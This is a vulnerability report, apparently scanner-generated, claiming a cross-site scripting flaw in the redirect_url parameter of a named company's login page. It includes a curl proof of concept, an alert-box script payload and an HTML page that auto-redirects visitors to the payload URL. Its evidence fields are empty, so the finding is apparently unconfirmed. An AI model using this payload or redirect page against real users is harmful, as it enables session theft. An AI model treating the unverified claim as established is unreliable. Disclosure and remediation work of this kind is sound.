# DOM XSS in GET https://account.box.com/login (High 8.1)

## Summary
The `redirect_url` parameter on `GET https://account.box.com/login` executes attacker-controlled JavaScript in a victim browser context, potentially allowing session impersonation and account compromise.

## Severity & CVSS 3.1 Rating
- **Severity**: High (8.1)
- **CVSS 3.1 Vector**: `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N`

## Steps To Reproduce
1. Send a `GET` request to `https://account.box.com/login`.
2. Place the payload in `redirect_url` (query).
3. Open the reproduction URL in a standard modern browser.
4. Observe execution of the attacker JavaScript payload confirmed by evidence.

### Proof of Concept (cURL Command)
```bash
curl -i -s -k -X GET "https://account.box.com/login?redirect_url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E"
```

### Standalone HTML Exploit (PoC)
```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>XSS PoC - https://account.box.com/login</title>
  <style>
    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 40px; background: #0d1117; color: #c9d1d9; }
    .card { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 24px; max-width: 700px; margin: 0 auto; box-shadow: 0 8px 24px rgba(0,0,0,0.5); }
    h1 { color: #58a6ff; font-size: 20px; margin-top: 0; }
    p { font-size: 14px; line-height: 1.6; color: #8b949e; }
    .btn { display: inline-block; background: #238636; color: #ffffff; padding: 10px 20px; border-radius: 6px; text-decoration: none; font-weight: bold; margin-top: 15px; }
    .btn:hover { background: #2ea043; }
    pre { background: #090d13; padding: 12px; border-radius: 6px; overflow-x: auto; color: #79c0ff; border: 1px solid #21262d; font-size: 13px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>XSS PoC - https://account.box.com/login</h1>
    <p>This standalone Proof of Concept demonstrates client-side JavaScript execution via parameter <code>redirect_url</code>.</p>
    <pre>https://account.box.com/login?redirect_url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E</pre>
    <a href="https://account.box.com/login?redirect_url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E" class="btn" target="_blank">Click Here to Launch Exploit</a>
  </div>
  <script>
    // Automatic navigation after 2 seconds
    setTimeout(function() {
      window.location.href = "https://account.box.com/login?redirect_url=%22%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E";
    }, 2000);
  </script>
</body>
</html>
```

## Payload
```html
"><script>alert(document.domain)</script>
```

## Impact
Confirmed browser JavaScript execution, potentially allowing session impersonation.

- Internal Impact Score: n/a
- Tags: browser-execution

## Supporting Evidence
- Finding ID: 31
- Execution IDs: n/a
- Oracle tokens: n/a
- Screenshots: n/a

## Remediation
- Apply context-aware contextual output encoding (e.g. HTML entity, JavaScript attribute, or URL encoding) before rendering untrusted input.
- Avoid assigning user-controllable input to dangerous execution sinks such as `innerHTML`, `document.write`, `eval`, `Function`, or navigation sinks (`location.href`).
- Enforce a restrictive Content Security Policy (CSP) with strict script-src and object-src directives.
- Add automated regression tests covering this endpoint and parameter.